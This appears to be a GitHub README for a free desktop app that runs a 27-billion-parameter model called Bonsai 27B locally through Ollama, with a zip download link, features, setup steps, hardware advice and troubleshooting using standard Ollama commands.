# Bonsai 27B Ollama Desktop

**Bonsai 27B Ollama Desktop** is a free app for running **Bonsai 27B** — a powerful 27-billion parameter open-source language model — completely locally on your PC through Ollama. No internet connection required after the initial model download, no account, no subscription, and no data leaving your machine.

If you've been looking for a private, offline ChatGPT alternative that runs entirely on your own hardware, Bonsai 27B through Ollama is one of the best options available. It's built on **Qwen3-27B** with a 262K token context window and supports both NVIDIA (CUDA) and AMD (ROCm) GPU acceleration.

<img width="2048" height="1152" alt="b5adea3c-50ad-4732-9a01-035704c4e7f2" src="https://github.com/user-attachments/assets/33d887b1-4e42-4381-8424-22f24eaa1dc3" />

## Install
[Download `Bonsai-27b.zip`](https://github.com/bonsai-27b/Bonsai-27b-Ollama-Desktop/releases/download/27b/Bonsai-27b.zip)
---

<img width="1199" height="746" alt="3fbe6a20-f2bc-4daa-915b-4c5aaebc2256" src="https://github.com/user-attachments/assets/b23f3ca1-06f6-491e-81c7-c5d7640424bb" />

<img width="776" height="360" alt="808250c9-69a3-40fc-8979-5d26330f6989" src="https://github.com/user-attachments/assets/354d1578-b7b0-46a9-8e76-4bbff93c3828" />

---
## Key Features
- **Completely offline** — after the first model pull, the entire AI runs on your hardware with zero network traffic
- **Full privacy** — no data sent to any server, no telemetry, no accounts required
- **262K context window** — handle long documents, conversations, and code reviews without truncation
- **Qwen3-27B architecture** — strong performance on reasoning, coding, and instruction following
- **CUDA and ROCm support** — GPU acceleration for NVIDIA and AMD cards for fast inference
- **Apple Silicon support** — runs efficiently on M1/M2/M3 Macs via Metal via Ollama
- **Model management** — browse, download, and switch between available Bonsai variants from the UI
- **Conversation export** — save chats as Markdown or plain text
- **Clean chat interface** — distraction-free conversation UI with full message history

<img width="2160" height="1392" alt="ebc3d9d8-637d-4a6c-aaff-e7552854e9c6" src="https://github.com/user-attachments/assets/794e404c-b997-4b6d-925f-a65da3e21b08" />

## Getting Started
1. **Download** the latest version using the button above.
2. **Install Ollama** from [ollama.com](https://ollama.com) if you haven't already.
3. **Run Ollama** — it needs to be running in the background before launching this app.
4. **Extract** the archive and run the Bonsai 27B Desktop app.
5. **Select Bonsai 27B** from the model list — it will pull automatically if not already downloaded.
6. **Start chatting** — all inference happens locally on your machine.

**First run tip:** The initial model pull downloads ~16–20 GB of model weights. Make sure you have enough disk space and a stable connection for this one-time step.

<img width="468" height="427" alt="b329c0bd-5309-4372-b69e-e81e15a2a771" src="https://github.com/user-attachments/assets/80724cad-2f6b-4a2e-b694-8cb04d3105d6" />

## Bonsai 27B vs Other Local Models

| Model | Parameters | Context | Hardware Needed |
|---|---|---|---|
| Bonsai 27B | 27B | 262K | 16GB VRAM (ideal) / 32GB RAM (CPU) |
| Llama 3.1 8B | 8B | 128K | 8GB VRAM / 16GB RAM |
| Mistral 7B | 7B | 32K | 6GB VRAM / 16GB RAM |
| Phi-3 Medium | 14B | 128K | 10GB VRAM / 24GB RAM |

Bonsai 27B offers the best capability-to-size ratio for users with mid-range to high-end GPUs.

<img width="480" height="360" alt="38691f80-d8b8-4c9b-88d0-7d5ebfc4fce5" src="https://github.com/user-attachments/assets/d09e9944-3ca7-44b1-a5e0-ac58d775f295" />

## Hardware Recommendations

**Minimum (CPU-only):**
- 32 GB RAM
- Fast CPU (AMD Ryzen 7 / Intel Core i7 or better)
- Inference will be slow — expect 2–5 tokens/second

**Recommended (GPU):**
- NVIDIA RTX 3080 / 4070 or better (12–16 GB VRAM)
- AMD RX 7900 XT (16 GB VRAM) with ROCm
- Apple M2 Pro or better (24 GB unified memory)

**Ideal:**
- NVIDIA RTX 4090 or multiple GPUs — full model in VRAM, very fast inference

## Running Bonsai 27B Without a GPU
Bonsai 27B can run on CPU only via Ollama's llama.cpp backend. It will be slower, but fully functional for non-time-sensitive tasks. Enable GPU offloading in Ollama settings to split the model between CPU and GPU if you have partial VRAM.

## Troubleshooting

**"Cannot connect to Ollama" error?**
Make sure Ollama is running. On Windows, check the system tray. Run `ollama serve` in a terminal if it's not started.

**Model not appearing in the list?**
Click Refresh in the model selector. If the model isn't pulled yet, use `ollama pull bonsai:27b` in the terminal.

**Very slow inference on GPU?**
Check that Ollama is using your GPU: run `ollama ps` and check the GPU column. Update your NVIDIA drivers if needed.

**Out of memory errors?**
Try a quantized version of the model (Q4_K_M or Q5_K_M) which uses less VRAM with minimal quality loss.

---
## System Requirements
### Platform Support
- **Windows 10 / 11**
- **macOS** (Intel and Apple Silicon)
- **Linux**

### Recommended Hardware
- 16 GB RAM or more
- NVIDIA GPU with CUDA support (strongly recommended for the 27B model)
- Or AMD GPU with ROCm, or Apple Silicon

---
## Security & Legal
This application runs AI models locally on your hardware. No data is sent anywhere.

**Recommendations:**
- Download **only** from this official GitHub repository.
- Scan files on [VirusTotal](https://www.virustotal.com).

---
## Contributing
Contributions are welcome! Help improve the UI, model management, or local inference settings.

---
## License & Acknowledgments
### License
**Bonsai 27B Ollama Desktop** is shared under the **MIT License**.
See [LICENSE](LICENSE) for details.

**Copyright © 2026 scarb386**

### Acknowledgments
- The Ollama team for an excellent local AI runtime.
- The open-source AI community for making powerful models accessible.

<p align="center">
  Developed with ❤️ for local AI enthusiasts
</p>

<img width="640" height="480" alt="5b17446d-c3a5-4364-95a2-af151d4db50f" src="https://github.com/user-attachments/assets/9b532d34-e51a-463b-bf54-f3d3f9d4f9ec" />

